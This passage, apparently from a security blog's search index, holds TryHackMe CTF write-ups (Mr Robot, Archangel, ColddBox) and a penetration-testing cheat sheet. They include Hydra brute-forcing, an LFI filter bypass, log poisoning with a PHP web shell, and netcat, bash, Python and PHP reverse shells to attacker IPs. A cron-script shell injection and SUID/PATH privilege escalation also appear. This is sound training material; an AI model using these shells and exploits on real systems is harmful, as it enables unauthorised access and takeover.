brute-force.\nDon\u0026rsquo;t forget to change the error message at the end of our post form.\n1  hydra -l Elliot -P fsocity.dic 10.10.43.138 http-post-form \u0026#34;/wp-login.php:log=^USER^\u0026amp;pwd=^PWD^:The password you entered for the username\u0026#34;   Hydra successfully found Elliot\u0026rsquo;s valid password ER28-0652.\nGaining Access Login in with obtained credentials.\nTheme Exploitation From the previous experiences exploiting Wordpress, we know that we can get a reverse shell through the page editor. Navigate to Appearance -\u0026gt; Editor\n\nWe will choose /archive.php and change its content to php reverse shell\nDon\u0026rsquo;t forget to specify your IP address and desired port. Press Update file button.\nBefore visiting updated php file, don\u0026rsquo;t forget to start a listener on your local machine.\nThen navigate to http://10.10.43.138/wp-content/themes/twentyfifteen/archive.php\nWe successfully gained access as a daemon user.\n1 2 3 4 5 6 7 8 9 10 11  nc -lnvp 53 listening on [any] 53 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.43.138] 43230 Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux 18:38:40 up 52 min, 0 users, load average: 0.07, 2.21, 3.72 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1(daemon) gid=1(daemon) groups=1(daemon) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=1(daemon) gid=1(daemon) groups=1(daemon) $ whoami   Let us start with enumeration and look for other users.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  daemon@linux:/home$ ls -la ls -la total 12 drwxr-xr-x 3 root root 4096 Nov 13 2015 . drwxr-xr-x 22 root root 4096 Sep 16 2015 .. drwxr-xr-x 2 root root 4096 Nov 13 2015 robot daemon@linux:/home$ cd robot cd robot daemon@linux:/home/robot$ ls -la ls -la total 16 drwxr-xr-x 2 root root 4096 Nov 13 2015 . drwxr-xr-x 3 root root 4096 Nov 13 2015 .. -r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt -rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5 daemon@linux:/home/robot$   We cannot read the second flag but we are able to read the password file.\n1 2 3  daemon@linux:/home/robot$ cat password.raw-md5 cat password.raw-md5 robot:c3fcd3d76192e4007dfb496cca67e13b   Content of the file looks like a backup of robot\u0026rsquo;s user password.\nCopy its content to your local machine and use hash-identifier to identify the hash type.\n1 2 3 4 5 6 7  echo \u0026#34;c3fcd3d76192e4007dfb496cca67e13b\u0026#34; | hash-identifier -------------------------------------------------- HASH: Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))   Then we will use hashcat to crack robots\u0026rsquo;s password with rockyou wordlist file.\n1 2 3  hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz   We successfully cracked his password.\nSwitch user to robot and read the content of the second key.\n1 2 3 4 5 6 7 8 9 10 11 12 13  daemon@linux:/home/robot$ su robot Password: abcdefghijklmnopqrstuvwxyz robot@linux:~$ cd ~ robot@linux:~$ ls -la total 16 drwxr-xr-x 2 root root 4096 Nov 13 2015 . drwxr-xr-x 3 root root 4096 Nov 13 2015 .. -r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt -rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5 robot@linux:~$ cat key-2-of-3.txt | wc -c cat key-2-of-3.txt | wc -c 33   Privilege Escalation We will start with checking for any SUID files that we have access to.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  robot@linux:~$ find / -perm -u=s -type f 2\u0026gt;/dev/null find / -perm -u=s -type f 2\u0026gt;/dev/null /bin/ping /bin/umount /bin/mount /bin/ping6 /bin/su /usr/bin/passwd /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn /usr/bin/gpasswd /usr/bin/sudo /usr/local/bin/nmap /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper /usr/lib/pt_chown   From the found ones we are able to escalate privileges with /nmap\nThe interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.\nFirst, we have to check the nmap\u0026rsquo;s version.\n1 2  robot@linux:~$ nmap --version nmap version 3.81   Use \u0026ndash;interactive flag and spawn the shell with !sh command.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  robot@linux:~$ nmap --interactive nmap --interactive Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h \u0026lt;enter\u0026gt; for help nmap\u0026gt; !sh # whoami root # cd /root # ls -la total 32 drwx------ 3 root root 4096 Nov 13 2015 . drwxr-xr-x 22 root root 4096 Sep 16 2015 .. -rw------- 1 root root 4058 Nov 14 2015 .bash_history -rw-r--r-- 1 root root 3274 Sep 16 2015 .bashrc drwx------ 2 root root 4096 Nov 13 2015 .cache -rw-r--r-- 1 root root 0 Nov 13 2015 firstboot_done -r-------- 1 root root 33 Nov 13 2015 key-3-of-3.txt -rw-r--r-- 1 root root 140 Feb 20 2014 .profile -rw------- 1 root root 1024 Sep 16 2015 .rnd # cat key-3-of-3.txt | wc -c cat key-3-of-3.txt | wc -c 33   Verifying we escalate privileges with whoami command gives us root.\nRead the content of the third key.\nCongratulations!\n","description":"Based on the Mr. Robot show, can you root this box?","id":3,"section":"posts","tags":["enumeration","wordpress","hash cracking","privilege escalation"],"title":"Mr Robot CTF [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/mr-robot-ctf/"},{"content":"   Title Archangel     Info Boot2root, Web exploitation, Privilege escalation, LFI   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  nmap -A -T4 10.10.226.24 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-05 01:08 CST Nmap scan report for 10.10.226.24 Host is up (0.077s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA) | 256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA) |_ 256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Wavefire No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).   In the browser navigate to http://{TARGET MACHINE IP}\n\nChange our hosts file (/etc/hosts) to resolve the domain.\n\nNavigating to our newly found domain we get the first flag.\n\nDirectory Brute-Forcing Let us continue with directory brute force.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -u http://mafialive.thm/ -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://mafialive.thm/ [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/02/05 01:18:34 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) =============================================================== 2021/02/05 01:19:12 Finished ===============================================================   Nothing interesting is found expect robots.txt\n\n\n\nPressing button reveals directory structure, which may lead to LFI vulnerability.\nLet us test this vulnerability by reading the mrrobot.php file.\nFor more information on LFI PHP Wrappers follow provided link:\nhttps://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601\nhttp://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php\r\n\nAfter decoding mrrobot.php on our local machine we can confirm that LFI vulnerability is present.\n\nAccessing passwd file is not allowed.\nNow we will encode the test.php for further analyses.\nhttp://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php\r\nSave given encoded string into a text file on your local machine and use base64 to deocde it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  !DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;INCLUDE\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Test Page. Not to be Deployed\u0026lt;/h1\u0026gt; \u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;/test.php?view=/var/www/html/development_testing/mrrobot.php\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;secret\u0026#34;\u0026gt;Here is a button\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; \u0026lt;?php //FLAG: thm{***************} function containsStr($str, $substr) { return strpos($str, $substr) !== false; } if(isset($_GET[\u0026#34;view\u0026#34;])){ if(!containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;../..\u0026#39;) \u0026amp;\u0026amp; containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;/var/www/html/development_testing\u0026#39;)) { include $_GET[\u0026#39;view\u0026#39;]; }else{ echo \u0026#39;Sorry, Thats not allowed\u0026#39;; } } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Gaining Access Based on the conditions we are no allowed to use \u0026ldquo;../..\u0026rdquo; and we have to start with \u0026ldquo;/var/www/html/development_testing\u0026rdquo;.\nWe can bypass the slash condition with double backslah: ../.. -\u0026gt; ..//..\nLet us test it on the passwd file.\n\nLet us check the apache2 configuration file.\nhttp://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc/apache2/envvars\r\nNow we must verify if we have access to these log files.\nhttp://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log\r\nGiven output confirmes that we have access to the log files and as an exploit we will use log poisoning:\nhttps://www.hackingarticles.in/apache-log-poisoning-through-lfi/\nTrying to access other useful files doesn\u0026rsquo;t work.\nLog Poisoning Start BurpSuite and intercept your request.\n\nTo achieve our goal, we have to inject cmd comment inside User-Agent by replacing highlighted data. Add cmd comment:\n1  \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]);?\u0026gt;  Also append \u0026amp;cmd=ls to GET parameter to list all the files in the current working directory.\n\nNext, we will prepare php reverse shell, use python simple server to host our shell file and download it to our target machine.\n1  python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;{LOCAL MACHINE IP}\u0026#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;   Use CyberChef to URL encode our python reverse shell:\npython3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.9.140.180%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(%5B%22/bin/sh%22,%22-i%22%5D);'\r\nBefore sending our request start a netcat listener on your local machine.\n\nSuccessfully we have a shell and also we found the first user flag.\nSystem Enumeration Now we will enumerate target machine with the help of linPEAS. Change directory to /tmp and on your local machine start python server where your linPEAS file is located: python3 -m http.server\nOn target machine download the file with command:\n1  wget {LOCAL MACHINE IP}:8000/linpeas.sh   Make linPEAS file runable with command:\n1  chmod +x linpeas.sh   And run:\n./linpeas.sh\r\n\nEnumeration reveled two interesting files.\nPassword backup file contains only a Youtube link.\nWe will focus on the helloworld.sh\n\n1 2 3 4 5 6  ww-data@ubuntu:/tmp$ cat /opt/helloworld.sh #!/bin/bash echo \u0026#34;hello world\u0026#34; \u0026gt;\u0026gt; /opt/backupfiles/helloworld.txt www-data@ubuntu:/tmp$ cat /home/archangel/myfiles/passwordbackup https://www.youtube.com/watch?v=dQw4w9WgXcQ   Horizontal Privilege Escalation Cronjob Exploitation This file is a cronjob running as user archangel.\nBecause we have a permission to write to this file, we will inject netcat reverse shell into helloworld.sh\nConfirm that netcat is installed:\n1 2  www-data@ubuntu:/opt$ which nc /bin/nc   With the following command we will append our reverse shell at the end of the helloworld.sh.\n1  www-data@ubuntu:/opt$ echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.9.140.180 4444 \u0026gt;/tmp/f\u0026#34; \u0026gt;\u0026gt; helloworld.sh   Now we have to start listener on our local machine and wait for the cronjob.\nThen upgrade received shell with python.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  nc -lnvp 4444 connect to [10.9.140.180] from (UNKNOWN) [10.10.91.247] 60616 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=1001(archangel) gid=1001(archangel) groups=1001(archangel) $ whoami archangel $ python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; archangel@ubuntu:~/secret$ ls -la ls -la total 32 drwxrwx--- 2 archangel archangel 4096 Nov 19 20:41 . drwxr-xr-x 6 archangel archangel 4096 Nov 20 15:22 .. -rwsr-xr-x 1 root root 16904 Nov 18 16:40 backup -rw-r--r-- 1 root root 49 Nov 19 20:41 user2.txt archangel@ubuntu:~/secret$ cat user2.txt cat user2.txt thm{*************}   Privilege Escalation Notice that backup file located in the secret directory has SUID file permission which means giving temporary permissions to a user to run a program / file with the permissions of the file owner rather that the user who runs it.\nWe will use strings command to pull strings out of the backup file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  archangel@ubuntu:~/secret$ strings backup /lib64/ld-linux-x86-64.so.2 setuid system __cxa_finalize setgid __libc_start_main libc.so.6 GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable u+UH []A\\A]A^A_ cp /home/user/archangel/myfiles/* /opt/backupfiles . . . . . . . . .   Path Variable Privilege Escalation We can see that cp command does not use the full path, which means that it is vulnerable to Path Variable Privilege Escalation:\nhttps://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/\nTo exploit this vulnerability, we will create our own path and variable for cp command so after backup file execution it will execute the cp located in our path.\nFirst, change directory to tmp, create a file called cp and change permissions to rwx for everybody.\nThen change PATH variable to /tmp and run backup.\nBecause root is the owner, upon execution we escalate privilege.\nGrab the flag!\n1 2 3 4 5 6 7 8 9  archangel@ubuntu:/tmp$ echo \u0026#34;/bin/bash\u0026#34; \u0026gt; cp archangel@ubuntu:/tmp$ chmod 777 cp archangel@ubuntu:/tmp$ export PATH=/tmp:$PATH archangel@ubuntu:/tmp$ ~/secret/backup root@ubuntu:/tmp# id uid=0(root) gid=0(root) groups=0(root),1001(archangel) root@ubuntu:/tmp# cd /root root@ubuntu:/root# cat root.txt thm{*********}   ","description":"Boot2root, Web exploitation, Privilege escalation, LFI","id":4,"section":"posts","tags":["enumeration","decoding","brute force","lfi","log poisoning","exploitation","privilege escalation"],"title":"Archangel [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/archangel/"},{"content":"DISCLAIMER\nAll information and software available on this site are for educational purposes only. Use these at your own discretion, the site owners cannot be held responsible for any damages caused. The views expressed on this site are our own and do not necessarily reflect those of our employers.\nUsage of all tools on this site for attacking targets without prior mutual consent is illegal. It is the end user’s responsibility to obey all applicable local, state and federal laws. We assume no liability and are not responsible for any misuse or damage caused by this site.\nProvided methodology and the tools used below correspond to my level of knowledge and experience.\nThis document is regularly updated.\nScanning Nmap  Scan for live hosts on the network and save the output to a file.  1  nmap -sn \u0026lt;TARGET IP\u0026gt;/24 -oN initial.nmap   Sort the discovered addresses, exclude your own IP address, and write the rest to a file.  1  cat initial.nmap | grep for | cut -d \u0026#34; \u0026#34; -f 5 \u0026gt; ips.txt   Perform a full TCP scan.  1  nmap -v -sV -A -T4 -n -Pn -p- -iL ips.txt --open      Flag Description     -v for Verbose   -sV for version identification   -A for detailed information and running some scripts   -T4 to speed things up   -n for disabling reverse DNS lookup   -Pn to assume the host is alive   -p- to scan all the ports   -iL to use a list of IPs as input (ips.txt)   \u0026ndash;open to see just open ports and not closed / filtered ones    Nessus  Start Nessus as a service.  1  service nessusd start   Check the status of the service.  1  service nessusd status    In the browser navigate to https://kali:8834/ and perform necessary scans.\n  Stop the service.\n  1  service nessusd stop   Webserver Enumeration Gobuster 1  gobuster dir -e -u http://\u0026lt;TARGET IP\u0026gt;/backup -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip,tar,tar.gz,tgz,phtml,db,sql,out,rar,js,pgp -U admin -P admin      Flag Description     dir Directory mode   -e Extended mode that renders the full URL.   -u Specify the website name that will be scanned.   -w Specify a wordlist that can be used for brute forcing directories.   -x List of extensions to search for.   -U Username   -P Password    Dirbuster 1  dirbuster   Brute Forcing Services FTP 1  hydra -l username -P \u0026lt;password-list.txt\u0026gt; \u0026lt;TARGET IP\u0026gt; ftp   POP3 1  hydra -l username -P \u0026lt;password-list.txt\u0026gt; \u0026lt;TARGET IP\u0026gt; pop3   SSH 1 2  hydra -L \u0026lt;user-list.txt\u0026gt; -P \u0026lt;password-list.txt\u0026gt; ssh://\u0026lt;TARGET IP\u0026gt; hydra -l username -P \u0026lt;password-list.txt\u0026gt; ssh://\u0026lt;TARGET IP\u0026gt;   Enumeration FTP 1  ftp \u0026lt;TARGET IP\u0026gt;   If FTP is running on a non-standard port add a port nummber after a target ip.\nTelnet 1  telnet \u0026lt;TARGET IP\u0026gt; \u0026lt;PORT\u0026gt;   Samba Port 139: originally ran on top of NetBIOS using port 139.\nPort 445: later versions of SMB (after Windows 2000) use port 445 on top of a TCP stack.\nNmap Scripts Enumeration:\n1  nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse \u0026lt;TARGET IP\u0026gt;   SMTP Auxilary Metasploit Modules 1  use auxiliary/scanner/smtp/smtp_version   1  use auxiliary/scanner/smtp/smtp_enum   SQL Server Auxilary Metasploit Modules Check if the found credentials are valid:\n1  use auxiliary/scanner/mssql/mssql_login   Automatic reconnaissance:\n1  use auxiliary/admin/mssql/mssql_enum   SSH Inspect the SSH service that runs on a non-standard port.\n1  ssh \u0026lt;TARGET IP\u0026gt; -p \u0026lt;PORT\u0026gt;   Password Cracking Identifying Hashes 1  hash-identifier hashvalue   John The Ripper List all of John\u0026rsquo;s formats:\n1  john --list=formats   Automatic Cracking:\n1  john --wordlist=\u0026lt;path-to-wordlist\u0026gt; hash.txt   Format-Specific Cracking:\n1  john --format=\u0026lt;format\u0026gt; --wordlist=\u0026lt;path-to-wordlist\u0026gt; hash.txt   Show the cracked passwords:\n1  john hash.txt --show   Cracking a Password Protected Zip File 1 2  zip2john zipfile.zip \u0026gt; zip_hash.txt john --wordlist=\u0026lt;path-to-wordlist\u0026gt; zip_hash.txt   Cracking a Password Protected RAR Archive 1 2  rar2john rarfile.rar \u0026gt; rar_hash.txt john --wordlist=\u0026lt;path-to-wordlist\u0026gt; rar_hash.txt   Cracking SSH Key Passwords 1 2  ssh2john id_rsa \u0026gt; id_rsa_hash.txt john --wordlist=\u0026lt;path-to-wordlist\u0026gt; id_rsa_hash.txt   Simple Local Web Servers Run a basic http server:\n1  python -m SimpleHTTPServer 80   Run a basic Python3 http server:\n1  python3 -m http.server   Reverse Shells Netcat Use a well-known port number (80, 443 or 53) as this is more likely to get past outbound firewall rules on the target.\n1  nc -lvnp \u0026lt;PORT\u0026gt;      Flag Description     -l Used to tell netcat that this will be a listener.   -v Verbose output.   -n Tells netcat not to resolve host names or use DNS.   -p Indicates that the port specification will follow.    Bash 1  /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ATTACKER IP\u0026gt;/\u0026lt;PORT\u0026gt; 0\u0026gt;\u0026amp;1   Python 1  python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;\u0026lt;ATTACKER IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;   PHP 1 2 3 4 5 6 7  php -r \u0026#39;$sock=fsockopen(\u0026#34;\u0026lt;ATTACKER IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;\u0026lt;ATTACKER IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;\u0026lt;ATTACKER IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);shell_exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;\u0026lt;ATTACKER IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);`/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3`;\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;\u0026lt;ATTACKER IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);system(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;\u0026lt;ATTACKER IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);passthru(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;\u0026lt;ATTACKER IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);popen(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;, \u0026#34;r\u0026#34;);\u0026#39;   Shell Stabilisation Some targets may require the version of Python specified (replace python with python2 / python3).\n1  python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;;   Give us access to term commands such as clear.\n1  export TERM=xterm   Background the shell with Ctrl + Z.\nIn our terminal we use following commands to turns off our own terminal echo (gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes) and then foregrounds the shell, which means completing the process.\n1  stty raw -echo; fg   Access Gained 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  ifconfig -a # Check local IP addresses and interfaces echo $0 # Check current shell whoami # Check current user  pwd # Check current folder history # List user\u0026#39;s commands history  uname -a # Provides important system information. netstat -anp # Check open ports and services listening cat /etc/hosts # Check defined hosts route -v # Check route sudo -l # Check sudo privileges crontab -l # Check crontab find / -uid 0 -perm -4000 -type f 2\u0026gt;/dev/null # Find SUID files owned by root  find / -perm -4000 -type f 2\u0026gt;/dev/null # Find SUID files find / -perm -2 -type d 2\u0026gt;/dev/null # World writable directories cat /etc/group # List groups, users cat /etc/passwd cat /etc/shadow # Only with root privileges   Miscellaneous IPv4 Cheat Sheets IPv4 Private Address Ranges    Class Range Default subnet mask     Class A 10.0.0.0 - 10.255.255.255 255.0.0.0   Class B 172.16.0.0 - 172.31.255.255 255.255.0.0   Class C 192.168.0.0 - 192.168.255.255 255.255.255.0    IP Range: 127.0.0.1 to 127.255.255.255 are network testing addresses (loop-back addresses)\nCommon Network Port Numbers 0 to 1023 : well known ports assigned to common protocols and services.\n1024 to 49151 : registered ports assigned by ICANN to a specific service.\n49152 to 65 535 : dynamic (private, high) ports used by any service on an ad hoc basis.\n   Port Service name Transport protocol     20, 21 File Transfer Protocol (FTP) TCP   22 Secure Shell (SSH) TCP and UDP   23 Telnet TCP   25 Simple Mail Transfer Protocol (SMTP) TCP   53 Domain Name System (DNS) TCP and UDP   67, 68 Dynamic Host Configuration Protocol (DHCP) UDP   80 HyperText Transfer Protocol (HTTP) TCP   110 Post Office Protocol (POP3) TCP   443 HTTP with Secure Sockets Layer (SSL) TCP and UDP   3389 Remote Desktop Protocol (RDP) TCP and UDP    Steganography Steghide Print an image information:\n1  steghide info image.jpeg   Extract data from an image:\n1  steghide extract -sf image.jpeg -p password   Zsteg 1  zsteg -a image.png   Exiftool 1  exiftool image.jpeg   References  PayloadsAllTheThings Penetration Testing Tools Cheat Sheet Penetration Testing Cheat Sheet  ","description":"Updated personal penetration testing cheat sheet organized by methodology.","id":5,"section":"posts","tags":[""],"title":"Penetration Testing Cheat Sheet","uri":"https://martinkubecka.github.io/en/posts/general/pentest-cheat-sheet/"},{"content":"   Title ColddBox     Info An easy level machine with multiple ways to escalate privileges.   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10  nmap -v -p- {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-10 03:55 CST Completed SYN Stealth Scan at 04:03, 486.51s elapsed (65535 total ports) Nmap scan report for 10.10.145.98 Host is up (0.071s latency). Not shown: 65533 closed ports PORT STATE SERVICE 80/tcp open http 4512/tcp open unknown   Now scan only found open ports 80 and 4512.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  nmap -sV -sC -p 80,4512 {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-10 04:05 CST Nmap scan report for 10.10.145.98 Host is up (0.072s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.1.31 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: ColddBox | One more machine 4512/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA) | 256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA) |_ 256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   \nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  gobuster dir -u http://{TARGET MACHINE IP} -w /usr/share/wordlists/dirb/big.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.145.98 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/01/10 03:56:57 Starting gobuster =============================================================== /.htaccess (Status: 403) /.htpasswd (Status: 403) /hidden (Status: 301) /server-status (Status: 403) /wp-admin (Status: 301) /wp-content (Status: 301) /wp-includes (Status: 301) =============================================================== 2021/01/10 03:59:37 Finished ===============================================================   \nFrom this message we will note three possible users: C0ldd, Hugo, Philip\nWordpress Enumeration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119  wpscan --url http://{TARGET MACHINE IP} -e [i] Updating the Database ... [i] Update completed. [+] URL: http://10.10.145.98/ [10.10.145.98] [+] Started: Sun Jan 10 04:07:51 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.145.98/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] WordPress readme found: http://10.10.145.98/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.145.98/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10). | Found 